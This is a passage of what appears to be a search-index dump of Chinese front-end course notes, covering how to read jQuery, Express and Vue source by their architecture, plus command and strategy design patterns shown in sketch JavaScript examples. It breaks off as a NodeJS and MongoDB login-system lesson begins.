</ul>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/","title":"10-\u5206\u6790\u6e90\u7801\u5b66\u67b6\u6784","text":""},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#_1","title":"\u7b2c\u5341\u8bfe \u5206\u6790\u6e90\u7801\u5b66\u67b6\u6784","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 4671  \u9605\u8bfb10\u5206\u949f</p> <p>https://study.163.com/course/courselive/1280302025.htm</p> <p>\u5982\u4f55\u770b\u6e90\u7801\uff1f\u5206\u6790 jquery \u6846\u67b6 express \u6846\u67b6\uff08\u4e24\u4e2a\u67b6\u6784\u4e0d\u540c\uff09</p>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#_2","title":"\u600e\u6837\u770b\u6e90\u7801","text":"<p>\u4e0d\u8981\u4e00\u53e5\u4e00\u53e5\u770b\u6e90\u7801</p> <p>\u5148\u770b\u67b6\u6784+\u518d\u627e\u5165\u53e3+\u6309\u7167\u6d41\u7a0b\u8bfb\u4e0b\u53bb\uff0c\u770b\u67b6\u6784\u5173\u952e\u7684\u90e8\u5206</p> <p>\u53ef\u4ee5\u5148\u7f29\u653e\u51fd\u6570\u5185\u90e8\u7684\u7ec6\u8282\uff08\u628a\u51fd\u6570\u5185\u90e8\u6298\u53e0\uff09</p> <p>jquery \u628a $ \u6302\u8f7d\u5230window\u4e0a\u9762\uff0cwindow \u5165\u53e3\u51fd\u6570\uff0c\u7136\u540e\u4e00\u6b65\u4e00\u6b65\u627e\uff08\u6d41\u7a0b\uff09</p>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#_3","title":"\u6e90\u7801\u7684\u7279\u5f81","text":"<p>\u7a0b\u5e8f\u5065\u58ee\u6027\uff1a\u4e00\u4e2a\u51fd\u6570\u524d\u9762\u662f\u53d8\u91cf\u5b9a\u4e49\uff0c\u6761\u4ef6\u5224\u65ad\uff08\u5f00\u59cb\u90e8\u5206\u51fd\u6570\u5065\u58ee\u6027\u5904\u7406\uff0cif\u5224\u65ad\uff09\uff0c\u540e\u9762\u7684\u662f\u51fd\u6570\u540e\u9762\u7684\u6267\u884c\u90e8\u5206\u3002</p> <p>\u5065\u58ee\u6027\u7c7b\u4f3c\u4e8e\u5bb9\u9519\u6027\uff08\u65b9\u6cd5\u9519\u8bef\u4f7f\u7528\u4e0b\uff0c\u4e0d\u81f3\u4e8e\u4e2d\u65ad\u6574\u4e2a\u64cd\u4f5c\uff09\uff0c\u6709\u53ef\u80fd\u51fa\u9519\u4e86\uff0c\u4f46\u662f\u627e\u4e0d\u5230\u95ee\u9898\u51fa\u5728\u54ea\u91cc\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u5224\u65ad\u53c2\u6570\u7684\u7c7b\u578b\uff08typeof\uff09\uff0c\u5426\u5219\u629b\u51fa\u9519\u8bef\uff08\u5f02\u5e38\uff09\u6216\u8005 try-catch \u64cd\u4f5c\uff08\u540e\u7aef\u6587\u4ef6\u64cd\u4f5c\uff0c\u670d\u52a1\u6301\u4e45\u6027\uff09</p> <pre><code>try {\n  fs.readFile();\n} catch(e) {\n  console.log(e);\n}\n</code></pre> <p>\u6a21\u5757\u5316\uff1a\u6a21\u5757\u8c03\u7528\u6a21\u5757\u3002</p> <p>\u6a21\u5757\u5316\u89c4\u8303\uff1aamd cmd require import commonJS \u7684\u89c4\u8303\uff1b\u4e0d\u540c\u7684\u6a21\u5757\u89c4\u8303</p>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#_4","title":"\u5178\u578b\u67b6\u6784","text":""},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#1","title":"1\u3001\u5de5\u5382\u6a21\u5f0f","text":"<p>\u5de5\u5382\u6a21\u5f0f\uff1ajquery zepto</p> <p>\u65b0\u5efa\u4e00\u4e2a\u5de5\u5382\u65b9\u6cd5\uff0c\u4f7f\u7528\u8005\u544a\u8bc9\u5de5\u5382\u9700\u8981\u4ec0\u4e48\uff0c\u5de5\u5382\u5c31\u63d0\u4f9b\u7ed9\u4f60\u8981\u7684\u5bf9\u8c61</p> <pre><code>window.$ = function() {\n  return new jquery.fn.init();\n  // \u8fd9\u91cc\u6ca1\u6709\u76f4\u63a5\u8fd4\u56de jquery \u907f\u514d\u5faa\u73af\u8c03\u7528\u6b7b\u5faa\u73af\n  // JS \u5982\u4f55\u67e5\u627e\u53d8\u91cf\uff1f\u4f5c\u7528\u57df\u4ece\u5185\u5230\u5916\u67e5\u627e\uff08\u5982\u679c\u76f4\u63a5\u7ed9\u51fawindow\uff0c\u90a3\u4e48\u4e0d\u9700\u8981\u4e00\u5c42\u4e00\u5c42\u67e5\u627e\u53d8\u91cf\uff0c\u8fd9\u662f\u6027\u80fd\u95ee\u9898\uff09\n}\n</code></pre> <p>\u66b4\u9732\u5728window\u4e0a\u9762\u7684\u662f\u4e00\u4e2a\u5de5\u5382\uff0c\u9700\u8981\u4ec0\u4e48\u4ea7\u54c1\uff0c\u90a3\u4e48\u4ece\u5de5\u5382\u4e2d\u8fd4\u56de\u5bf9\u5e94\u7684\u5b9e\u4f8b\uff1bjquery</p> <p>\u76f4\u63a5\u4f7f\u7528 $ \u7136\u540e \u6e90\u7801\u4e2d\u5b9e\u73b0 new jquery.fn...</p> <p>$ \u597d\u5904</p> <p>\u4f8b\u5b50\uff1ajquery \u6e90\u7801\u5206\u6790</p> <p>\u590d\u6742\u529f\u80fd\u5206\u6210\u591a\u4e2a\u6a21\u5757\uff0c\u4e0d\u540c\u6a21\u5757\u8c03\u7528\uff1b</p> <p>Extend \u65b9\u6cd5\uff1a\u4e0d\u540c\u53c2\u6570\u60c5\u51b5\u4e0d\u540c\uff0c\u4e00\u4e2a\u53c2\u6570\u548c\u4e24\u4e2a\u53c2\u6570\u7684\u533a\u522b</p> <p>\u5171\u4eab\u516c\u5171\u53d8\u91cf\u6a21\u5f0f\uff08\u7c7b\u4f3c\u7684\u7ed3\u6784\u4e2d\uff0c\u53ef\u4ee5\u628a\u516c\u5171\u53d8\u91cf\u63d0\u51fa\u6765\uff09\u4eab\u5143\u6a21\u5f0f</p> <p>\u8fde\u7b49\u601d\u60f3\uff08\u4e00\u4e2a\u65b9\u6cd5\u7ed1\u5b9a\u5230\u4e0d\u540c\u5bf9\u8c61\u4e0a\uff0c\u90a3\u4e48\u4e0d\u540c\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff09</p>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#2","title":"2\u3001\u5efa\u9020\u8005\u6a21\u5f0f","text":"<p>express VUE 2.0</p> <p>new VUE() \u76f4\u63a5\u521b\u5efa\u5b9e\u4f8b</p> <p>express \u6846\u67b6\uff1a\u5efa\u9020\u8005\u6a21\u5f0f</p> <p>node \u6846\u67b6\uff08\u7c7b\u4f3c\u7684\u8fd8\u6709webpack\uff09main.js </p> <p>Require \u5c31\u662f\u5165\u53e3</p> <pre><code>function createApplication() {\n  var app = function(req, res, next) {\n    app.handle(req, res, next);\n  };\n  mixin(app, EventEmitter.prototype, false);\n  mixin(app, proto, false);\n\n  app.request = Object.create(req, {\n    app: {\n      configurable: true,\n      enumerable: true,\n      writable: true,\n      value: app,\n    }\n  });\n  app.response = Object.create(res, {\n    app: {\n      configurable: true,\n      enumerable: true,\n      writable: true,\n      value: app,\n    }\n  });\n  app.init();\n  return app;\n}\n</code></pre> <p>\u5de5\u5382\u6a21\u5f0f\u548c\u5efa\u9020\u8005\u6a21\u5f0f\u5bf9\u7acb\uff1a\u5de5\u5382\u6a21\u5f0f\u9700\u8981\u591a\u6b21\u83b7\u53d6\u5bf9\u8c61\uff08\u9700\u8981\u5feb\u901f\u83b7\u53d6\uff09\uff1b\u5efa\u9020\u8005\u6a21\u5f0f\u9700\u8981\u83b7\u53d6\u5c11\u6570\u590d\u6742\u7684\u5bf9\u8c61\uff08\u9700\u8981\u4f20\u591a\u4e2a\u53c2\u6570\uff09\uff1b\u90fd\u662f\u521b\u5efa\u8005\u6a21\u5f0f\u3002$ \u9891\u7e41\u4f7f\u7528\uff0c\u90a3\u4e48\u4f7f\u7528\u5de5\u5382\u578b\u3002VUE \u662f\u5355\u9875\u9762\uff0c\u90a3\u4e48\u4f7f\u7528\u521b\u5efa\u8005\u3002</p> <p>\u4f8b\u5982\uff1a\u5982\u679c\u5927\u91cf\u7684\u76f8\u540c\u7684\u7b80\u5355\u7684\u5f39\u7a97\uff0c\u5de5\u5382\u6a21\u5f0f\uff1b\u8f6e\u64ad\u56fe\uff0c\u90a3\u4e48\u9700\u8981\u4f20\u53c2\uff0c\u5f88\u5c11\uff0c\u6240\u4ee5\u4f7f\u7528\u5efa\u9020\u8005\u6a21\u5f0f\u3002</p> <p>\u591a\u4eba\u5199\u4e0d\u540c\u7684\u6a21\u5757\uff1b\u5199\u597d\u540e\u6df7\u5408\u8fdb\u6765\uff08\u6ce8\u5165 mixin\uff09\u5efa\u9020\u8005\u6982\u5ff5</p> <p>\u5982\u679c\u76f4\u63a5\u5728\u539f\u578b\u4e0a\u5199\uff0c\u4f1a\u9020\u6210\u539f\u578b\u6ce8\u5165\u6f0f\u6d1e\uff1b</p> <pre><code>(function (global, factory) {\n  typeof exports === 'object' &amp;&amp; typeof module !== 'undefined' ? module.exports = factory() : typeof define === 'function' &amp;&amp; define.amd ? define(factory) : (global = global || self, global.Vue = factory());\n}(this, function() {\n  'use strict';\n  var emptyObject = Object.freeze({});\n  function isUndef(v) {\n    return v === undefined || v === null\n  }\n  ...\n}));\n</code></pre>"},{"location":"ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/#3","title":"3\u3001\u51fd\u6570\u5f0f","text":"<p>\u51fd\u6570\u5f0f\uff1aVUE3.0 lodash \u5f88\u591a function </p> <p>\u51fd\u6570\u5f0f\u4f18\u70b9\uff1a</p> <ol> <li>\u7ec4\u5408\u5927\u4e8e\u7ee7\u627f\uff1a\u5982\u679cC\u7ee7\u627f\u4e8eA\u548cB\u7684\u7279\u6027\uff0c\u7ee7\u627f\u6bd4\u8f83\u9ebb\u70e6\uff1b\u51fd\u6570\u5f0f\u76f4\u63a5\u8c03\u7528\u65b9\u6cd5\uff08C\u8c03\u7528AB\u7684\u65b9\u6cd5\uff09</li> <li>tree-shaking\uff08\u6447\u6811\uff09\uff1a\u6211\u4eec\u5f15\u75282000\u4e2a\u65b9\u6cd5\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u7528\u4e86\u4e00\u4e2a1\u4e2a\u65b9\u6cd5\u3002\u4f7f\u7528webpack\u6253\u5305\u65f6\u5019\uff0c\u90a3\u4e48\u53ef\u80fd\u6253\u53052000\u4e2a\u3002\u6700\u597d\u662f\u628a1999\u4e2a\u529f\u80fd\u53bb\u6389\uff0cwebpack \u4f1a\u6309\u9700\u52a0\u8f7d\uff08\u6253\u5305\uff09tree-shaking \u662f\u57fa\u4e8e export \u7684\u6587\u6863\u6d41\u3002jquery \u4f1a\u628a\u5168\u90e8\u7684\u5185\u5bb9\u6253\u5305\uff08\u5185\u90e8\u7684\u65b9\u6cd5\u4e0d\u80fd\u53bb\u6389\uff09\u51fd\u6570\u5f0f\u53ef\u4ee5\u8f93\u51fa\u5f88\u591a\u5c0f exports \u90a3\u4e48\u53ef\u4ee5\u652f\u6301 tree-shaking \u4e0d\u9700\u8981\u7684\u90e8\u5206\u3002\u5f88\u591a exports \u7684\u6587\u6863\u6d41\u3002\u5de5\u5382\u6a21\u5f0f\u548c\u5efa\u9020\u8005\u6a21\u5f0f\u65e0\u6cd5\u751f\u6548\u3002</li> </ol> <p>\u4f8b\u5b50\uff1alodash\u662f\u5355\u72ec\u7684\u51fd\u6570</p> <p>express \u67b6\u6784\uff1a\u628a\u4e1a\u52a1\u89c4\u5212\u6210\u4e0d\u540c\u7684\u6a21\u5757\uff1b\u4e0d\u540c\u7684\u6a21\u5757\u7684\u901a\u4fe1\u5173\u7cfb\uff08\u6c9f\u901a\u7ec4\u5408\uff0c\u4e92\u76f8\u8c03\u7528\uff09\uff1b</p>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/","title":"\u7b2c11\u8bfe \u4ece\u4e24\u4e2a\u9700\u6c42\u51fa\u53d1\uff0c\u7ec3\u5c31\u9ad8\u8d28\u91cf\u4ee3\u7801","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7133  \u9605\u8bfb15\u5206\u949f</p> <p>\u3010\u8bfe\u7a0b\u5927\u7eb2\u3011</p> <p>1\u3001\u5982\u4f55\u4fdd\u969c\u4ee3\u7801\u7684\u5065\u58ee\u6027\uff08\u51fd\u6570\u53c2\u6570\u9a8c\u8bc1\uff0c\u5bf9\u8c61\u5c5e\u6027\u9a8c\u8bc1\uff0c\u8c03\u7528\u51fd\u6570\u524d\u9a8c\u8bc1\uff09</p> <p>2\u3001\u5982\u4f55\u4f18\u5316\u590d\u6742\u7684\u8bed\u53e5\u7ed3\u6784\uff08\u4eab\u5143\u6a21\u5f0f\u4f18\u5316\u91cd\u590d\u4ee3\u7801\uff0c\u7b56\u7565\u6a21\u5f0f\u4f18\u5316\u591a\u91cd\u5206\u652f\uff09</p> <p>3\u3001\u5982\u4f55\u4f18\u96c5\u7684\u6269\u5c55\u548c\u4fee\u6539\uff08\u547d\u4ee4\u6a21\u5f0f\u5b9e\u73b0\u6a21\u5757\u5b8c\u7f8e\u5c01\u88c5\uff09</p> <p>\u3010\u4e3b\u8981\u77e5\u8bc6\u70b9\u3011\u6570\u636e\u9a71\u52a8\uff1b\u547d\u4ee4\u6a21\u5f0f\uff1b\u5982\u4f55\u5199\u597d\u529f\u80fd</p> <p>\u9ad8\u7ea7\u524d\u7aef\u548c\u521d\u7ea7\u524d\u7aef\u7684\u5dee\u8ddd\u5728\u54ea\u91cc\uff1f\u529f\u80fd\u57fa\u672c\u76f8\u540c\uff0c\u4ee3\u7801\u5b9e\u73b0\u4e0d\u540c\uff1b</p> <p>\u4ee3\u7801\u4e0d\u597d\u7279\u70b9\uff1a\u62ff\u5230\u9700\u6c42\u540e\uff0c\u76f4\u63a5\u5199\u4ee3\u7801\u5b9e\u73b0\u529f\u80fd\uff0c\u4e0d\u601d\u8003\u600e\u6837\u5199\uff1b</p> <p>\u5b9e\u9645\u8fd0\u884c\u4e2dbug\u6bd4\u8f83\u591a\uff0c\u800c\u4e14\u6539bug\u6bd4\u8f83\u590d\u6742\uff1b</p> <p>\u4ee3\u7801\u7684\u6269\u5c55\u6027\u548c\u79fb\u690d\u6027\u8f83\u5dee\uff08\u65b0\u529f\u80fd\u6216\u8005\u66f4\u6539\u5df2\u6709\u529f\u80fd\u5f88\u590d\u6742\uff09</p>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/#01","title":"01 \u9700\u6c42\u529f\u80fd\u5230\u6a21\u5757\u5b9e\u73b0","text":"<p>\u9700\u6c42\uff1a\u53ef\u4ee5\u6570\u503c\uff0c\u53ef\u4ee5\u5de6\u53f3\u79fb\u52a8DIV\uff1b\u53ef\u4ee5\u64a4\u9500\u548c\u524d\u8fdb\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u6846\u67b6\uff0c\u539f\u751fJS\u600e\u6837\u5b9e\u73b0\uff1f</p> <p>\u754c\u9762DIV\u79fb\u52a8\u6a21\u5757\uff0c\u8f93\u5165\u6307\u4ee4\u6a21\u5757\uff0c\u72b6\u6001\u8bb0\u5f55\u6a21\u5757\uff08undo-redo\uff09\uff08\u4e24\u4e2a\u8f93\u5165\u6a21\u5757\uff0c\u4e00\u4e2a\u72b6\u6001\u6570\u636e\u6a21\u5757\uff0c\u4e00\u4e2a\u754c\u9762\u6a21\u5757div\uff09\uff1b\u6a21\u5757\u4e4b\u524d\u600e\u6837\u6d88\u606f\u6c9f\u901a</p> <p>\u62ff\u5230\u9700\u6c42\u540e\uff0c\u4e0d\u662f\u9a6c\u4e0a\u53bb\u5199\uff0c\u800c\u662f\u60f3\u60f3\u5212\u5206\u6210\u54ea\u4e9b\u6a21\u5757\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff1a\u4e8b\u4ef6\u9a71\u52a8\uff08\u539f\u751fJS\uff09-\u6570\u636e\u72b6\u6001\u9a71\u52a8\uff08React\uff09</p> <p>\u4e8b\u4ef6\u89e6\u53d1\uff0c\u6539\u53d8\u6570\u636e\uff0c\u6620\u5c04\u5668\uff0c\u53cd\u6620\u5230DOM\uff08\u64cd\u4f5c\u6570\u636e\u8f83\u7b80\u5355\uff0c\u64cd\u4f5cDOM\u6027\u80fd\u8f83\u590d\u6742\uff09React \u7684\u6838\u5fc3\u601d\u60f3\uff08\u72b6\u6001\u9a71\u52a8-\u6570\u636e\u9a71\u52a8\uff09\u4e8b\u4ef6\u7ed1\u5b9a\u548c\u51fd\u6570\u6d41\u7a0b\u5206\u79bb\u3002\uff08\u51fd\u6570\u6700\u5c0f\u7684\u5b9e\u73b0\u529f\u80fd\u7684\u5355\u5143\uff09</p> <pre><code>// \u6a21\u5757\u4f4e\u8026\u5408\uff08\u6570\u636e\u5c42\u548c\u89c6\u56fe\u5c42\u5206\u79bb\uff09\nfunction changediv(dataObj) {\n  // parameter validate\n  if (!dataObj instanceof DataManager) {\n    throw new Error('dataObj must be an instance of DataManager');\n  }\n  let _data = dataObj.getData();\n  dom.style[_data.property] = _data.num;\n}\n\nfunction DataManager() {\n  this.stateArr = [{property: 'left', num: 0}];\n  this.nowState = 0;\n}\n\nDataManager.prototype.pushState = function(data) {\n  this.stateArr.push(data);\n  this.nowState = this.stateArr.length - 1;\n}\n\nDataManager.prototype.getBack = function() {\n  if (this.nowState &gt; 0) this.nowState--;\n}\n\nDataManager.prototype.getFront = function() {\n  if (this.nowState &lt; this.stateArr.length - 1) this.nowState++;\n}\n\nDataManager.prototype.getData = function() {\n  return this.stateArr[this.nowState];\n}\n\nlet DataManagerObj = new DataManager();\ndocument.getElementById('toleft').onclick = function() {\n  DataManagerObj.pushState({property: 'right', num: input.value });\n  changediv(DataManagerObj);\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/#_1","title":"\u547d\u4ee4\u6a21\u5f0f","text":"<p>\u547d\u4ee4\u6a21\u5f0f\uff1a\u628a\u5177\u4f53\u7684\u6307\u4ee4\u548c\u5b9e\u73b0\u5206\u79bb\uff0c\u5bf9\u8c03\u7528\u548c\u6267\u884c\u89e3\u8026</p> <p>\u505a\u6cd5\uff1a\u628a\u65b9\u6cd5\u6570\u636e\u5c01\u88c5\u5230\u5355\u4e00\u7684\u5bf9\u8c61\u5185\u90e8\uff0c\u8c03\u7528\u65b9\u548c\u6267\u884c\u65b9\u5b9e\u73b0\u89e3\u8026\uff0c\u804c\u8d23\u5206\u79bb\u539f\u5219\u3002</p> <p>\u89e3\u51b3\u7684\u95ee\u9898\uff1a\u53ea\u9700\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff08API\uff09\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u77e5\u9053\u5177\u4f53\u6267\u884c\u64cd\u4f5c\u7684\u5bf9\u8c61\uff08API\u5185\u90e8\u539f\u7406\uff09\u3002\u6211\u4eec\u628a\u6240\u6709\u7684\u64cd\u4f5c\u5c01\u88c5\u5230\u5355\u4e00\u5bf9\u8c61\u4e2d\uff0c\u7136\u540e\u53d1\u9001\u4e00\u4e2a\u6307\u4ee4\uff0c\u8fd9\u4e2a\u5355\u4e00\u5bf9\u8c61\u89e3\u51b3\u5177\u4f53\u7684\u547d\u4ee4\u5b9e\u73b0\u3002</p> <p>\u4f7f\u7528\u547d\u4ee4\u6a21\u5f0f\u5bf9\u4e0a\u9762\u4ee3\u7801\u8fdb\u884c\u4f18\u5316</p> <pre><code>// \u533f\u540d\u51fd\u6570\u81ea\u6267\u884c\uff0c\u8fd4\u56de\u4e0b\u9762\u7684\u5bf9\u8c61\uff08\u5185\u542b\u4e0d\u540c\u7684\u51fd\u6570\uff09\nreturn {\n  execute: function(commander) {\n    let commanderArr = ['back', 'front'];\n    if (typeof commander === 'object') {\n      DataManagerObj.pushState(commander);\n      changediv(DataManagerObj);\n    } else {\n      let has = false;\n      if (commanderArr.includes(commander)) {\n        has = true;\n        // \u4f7f\u7528\u7b56\u7565\u6a21\u5f0f\u4f18\u5316\n        let state = {\n          front: function() {\n            //\n          },\n          back: function() {\n            //\n          },\n          any: function() {\n            //\n          },\n        };\n        // \u5982\u679c\u4f7f\u7528 if-else \u591a\u91cd\u6761\u4ef6\u5224\u65ad\uff0c\u4ee3\u7801\u5206\u652f\u8f83\u590d\u6742\n        state[commander];\n      }\n    }\n  }\n}\n\n// \u5916\u90e8\u8c03\u7528\nlet input = document.getElementById('num');\ndocument.getElementById('toLeft').onclick = function() {\n  handleDiv.execute({property: 'right', num: input.value + 'px'});\n}\ndocument.getElementById('toRight').onclick = function() {\n  handleDiv.execute({property: 'left', num: input.value + 'px'});\n}\ndocument.getElementById('back').onclick = function() {\n  handleDiv.execute('back');\n}\ndocument.getElementById('front').onclick = function() {\n  handleDiv.execute('front');\n}\n// \u4e0d\u8db3\u4e4b\u5904\uff1a\u63a5\u53e3\u4f20\u5165\u7684\u6570\u636e\u7c7b\u578b\u53ef\u80fd\u662f\u5bf9\u8c61\u6216\u8005\u662f\u5b57\u7b26\u4e32\n</code></pre>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/#_2","title":"\u7b56\u7565\u6a21\u5f0f","text":"<p>\u4f7f\u7528\u5bf9\u8c61\u5b58\u50a8\u6bcf\u4e00\u79cd\u60c5\u51b5\uff0c\u4ee3\u66ff\u591a\u5c42\u7684 if-else\u3002\u4ee3\u7801\u6269\u5c55\u540e\uff0c\u53ea\u9700\u8981\u6269\u5c55\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\u548c\u5bf9\u5e94\u7684\u5904\u7406\u51fd\u6570\uff0c\u4e0d\u9700\u8981\u65b0\u52a0\u5165else-if\u9020\u6210\u903b\u8f91\u6df7\u4e71\u3002\uff08switch\u4e5f\u662f\u7c7b\u4f3c\u7684\uff09</p>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/#2","title":"\u9700\u6c422","text":"<p>\u9700\u6c42\uff1a\u505a\u4e00\u4e2a\u753b\u5eca\u6548\u679c\uff1a\u540e\u7aef\u63d0\u4f9b\u56fe\u7247\u7684\u6570\u91cf\u548c\u4fe1\u606f\u3002\u524d\u7aef\u53ef\u4ee5\u9009\u62e9\u6392\u5217\u987a\u5e8f\uff1b\u6bcf\u4e2a\u56fe\u7247\u4e0b\u9762\u6709\u8bf4\u660e\u6587\u5b57\u3002</p> <p>\u6a21\u5757\u5316\u601d\u8003\uff1a\u547d\u4ee4\u89e3\u6790\u6a21\u5757\uff1b\u751f\u6210DOM\u8282\u70b9\uff1b\u6e32\u67d3DOM\uff08React\u6846\u67b6\u4e2d\uff0c\u540e\u4e24\u4e2a\u90e8\u5206\u6846\u67b6\u5b8c\u6210\u529f\u80fd\u5b9e\u73b0\uff09</p> <p>\u8f93\u5165\u7684\u914d\u7f6e\uff0c\u548c\u9ed8\u8ba4\u7684\u6307\u4ee4\u5408\u5e76\uff0c\u7136\u540e\u5b9e\u9645\u6267\u884c\uff08\u6709\u7684\u6307\u4ee4\u4e0d\u9700\u8981\u7528\u6237\u76f4\u63a5\u8f93\u5165\uff1b\u9632\u6b62\u7528\u6237\u6f0f\u8f93\u5165\uff0c\u51fd\u6570\u7684\u5065\u58ee\u6027\uff0c\u8bbe\u7f6e\u7ec4\u4ef6\u7684 defaultConfig defaultProps\uff09</p> <pre><code>function Picture(commander) {\n  this.html = '';\n  this.render(commander);\n}\n\nPicture.prototype.initData = function(commander) {\n  // \u53c2\u6570\u9884\u5904\u7406\n  const defaultConfig = {\n    data: [],\n    id: document,\n    way: 'normal',\n    size: [100, 100],\n  };\n  let final = {};\n  for (let item in defaultConfig) {\n    if (commander[item]) {\n      final[item] = commander[item];\n      if (item === 'id') {\n        final.id = document.getElementById(commander.id);\n      }\n    } else {\n      final[item] = defaultConfig[item];\n    }\n  }\n  return final;\n}\n\nPicture.prototype.initDom = function(commander) {\n  const styleArr = [\n    {\n      float: 'left',\n      position: 'relative'\n    },\n    {\n      width: '100%',\n      height: '100%'\n    },\n  ];\n  let wraper = document.createElement('div');\n  let commanderHandle = {\n    normal: function(arr) {\n      return arr;\n    },\n    inverted: function(arr) {\n      return arr.reverse();\n    },\n  };\n  let _data = commander.data.forEach((url, index) =&gt; {\n    let div = document.createElement('div');\n    let span = document.createElement('span');\n    let styleObj = null;\n    let handleDom = null;\n    styleArr.forEach((style, index) =&gt; {\n      switch(index) {\n        case 1:\n          handleDom = div;\n            break;\n        case 0:\n          handleDom = span;\n          break;\n      }\n    })\n  })\n}\n\nPicture.prototype.renderDom = function() {\n  //\n}\n\nPicture.prototype.render = function(commander) {\n  let order = this.initData(commander);\n  this.initDom(order);\n  this.renderDom(order.id);\n}\n\nnew Picture({\n  el,\n  data,\n  ...\n});\n</code></pre>"},{"location":"ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/#_3","title":"\u603b\u7ed3","text":"<p>\u5148\u5b66\u4e60\u600e\u6837\u5199\u597d\u4ee3\u7801\uff0c\u7136\u540e\u5b66\u4e60\u600e\u6837\u5b66\u4e60\u6846\u67b6\uff0c\u6846\u67b6\u548c\u5e93\u662f\u5b66\u4e0d\u5b8c\u7684\uff01\uff08\u7cbe\u901a\u4e00\u4e2a\u6846\u67b6\uff09\u81ea\u5df1\u5199\u5b8c\u4ee3\u7801\uff0c\u4e00\u53e5\u4e00\u53e5\u4ece\u5fae\u89c2\u7684\u89d2\u5ea6\u4f18\u5316\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u7ec4\u4ef6\u6a21\u5757\u529f\u80fd\u7684\u89d2\u5ea6\u6574\u4f53\u4ee3\u7801\u4f18\u5316\uff08\u91cd\u6784\uff09\uff0c\u7136\u540e\u4f7f\u7528\u4e00\u4e9b\u5b9e\u9645\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u8fd9\u6837\u624d\u80fd\u63d0\u5347\u81ea\u5df1\u3002\u5c1d\u8bd5\u4f7f\u7528\u65b0\u7684\u8bed\u6cd5\u548c\u6548\u679c\u3002\u4f7f\u7528\u8bbe\u8ba1\u6a21\u5f0f\u548c\u7f16\u7a0b\u601d\u7ef4\u4f18\u5316\u4ee3\u7801\uff1b\u5199\u5b8c\u754c\u9762\uff0c\u7136\u540e code review \u7136\u540e\u4e0d\u65ad\u603b\u7ed3\u4ee3\u7801\u3002</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/","title":"\u7b2c12\u8bfe nodeJS+MongoDB\u767b\u5f55\u7cfb\u7edf","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6244  \u9605\u8bfb13\u5206\u949f</p> <p>\u3010\u8bfe\u7a0b\u4e3b\u9898\u3011\u6253\u901a\u5168\u6808\uff0c\u8f7b\u677e\u5b9e\u73b0NodeJS+MongoDB\u7684\u767b\u5f55\u7cfb\u7edf</p> <p>\u3010\u8bfe\u7a0b\u5927\u7eb2\u3011 1\u3001MongoDB\u7684\u57fa\u672c\u4f7f\u7528 2\u3001NodeJS\u5982\u4f55\u64cd\u4f5cMongoDB 3\u3001\u57fa\u4e8eNodeJS\u4e0eMongoDB\u7684\u767b\u5f55\u7cfb\u7edf\u7684\u5b9e\u73b0</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#nodejs","title":"NodeJS \u57fa\u7840","text":"<p>\u4f20\u7edf\u7684\u524d\u7aef\uff1a\u754c\u9762\u4ea4\u4e92\u3001JS \u6027\u80fd\u3001\u7528\u6237\u4f53\u9a8c</p> <p>nodeJS 